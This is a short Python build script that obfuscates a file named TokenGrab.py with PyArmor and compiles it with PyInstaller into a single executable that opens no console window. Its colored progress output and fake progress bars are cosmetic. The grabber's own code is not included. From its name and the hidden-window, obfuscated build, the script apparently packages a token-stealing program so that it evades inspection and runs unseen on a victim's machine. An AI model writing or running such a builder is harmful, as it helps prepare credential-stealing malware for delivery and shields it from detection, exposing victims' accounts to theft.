import os
import time
import subprocess
from tqdm import tqdm
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Paths
script_to_obfuscate = 'TokenGrab.py'
obfuscated_directory = 'dist_obfuscated/'
obfuscated_script = os.path.join(obfuscated_directory, 'TokenGrab.py')  # Use original filename

# Colors for output
INFO = Fore.CYAN + "[INFO]" + Style.RESET_ALL
SUCCESS = Fore.GREEN + "[SUCCESS]" + Style.RESET_ALL
ERROR = Fore.RED + "[ERROR]" + Style.RESET_ALL
LOADING = Fore.YELLOW + "[LOADING]" + Style.RESET_ALL

# Function to display loading animation
def loading_animation(text):
    for _ in range(5):
        print(LOADING + f" {text}...", end="\r")
        time.sleep(0.2)
    print(LOADING + f" {text} complete!")

# Obfuscate the script using PyArmor's 'gen' command (PyArmor 8+)
def obfuscate_script():
    try:
        loading_animation("Obfuscating TokenGrab.py")
        os.system(f'pyarmor gen --output {obfuscated_directory} {script_to_obfuscate}')
        print(SUCCESS + " Obfuscation completed.")
    except Exception as e:
        print(ERROR + f" Error during obfuscation: {e}")
        return False
    return True

# Compile the obfuscated script into an executable using PyInstaller
def compile_to_exe():
    try:
        loading_animation("Compiling obfuscated script to .exe")
        os.system(f'pyinstaller --onefile --noconsole {obfuscated_script}')
        print(SUCCESS + " Compilation to .exe completed.")
    except Exception as e:
        print(ERROR + f" Error during compilation: {e}")
        return False
    return True

# Display a progress bar using tqdm
def progress_bar(task, seconds):
    for _ in tqdm(range(seconds), desc=task):
        time.sleep(1)

# Main function
def main():
    print(INFO + " Starting obfuscation and compilation process...")

    # Step 1: Obfuscate the Python script
    if obfuscate_script():
        progress_bar("Obfuscating", 3)

        # Step 2: Compile obfuscated script to executable
        if compile_to_exe():
            progress_bar("Compiling to .exe", 3)
        else:
            print(ERROR + " Compilation to .exe failed.")
    else:
        print(ERROR + " Obfuscation failed.")

    print(SUCCESS + " Process completed. Check the dist/ directory for the .exe file.")

if __name__ == "__main__":
    main()
